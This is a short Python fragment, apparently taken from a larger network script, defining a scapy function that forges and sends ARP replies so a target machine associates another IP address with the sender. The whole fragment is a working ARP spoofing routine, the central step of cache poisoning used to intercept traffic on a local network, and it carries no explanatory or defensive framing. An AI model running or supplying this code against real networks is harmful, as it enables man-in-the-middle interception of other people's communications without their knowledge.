def spoof(target_ip, spoof_ip):
	packet = scapy.ARP(op = 2, pdst = target_ip,
					hwdst = get_mac(target_ip),
							psrc = spoof_ip)

	scapy.send(packet, verbose = False)
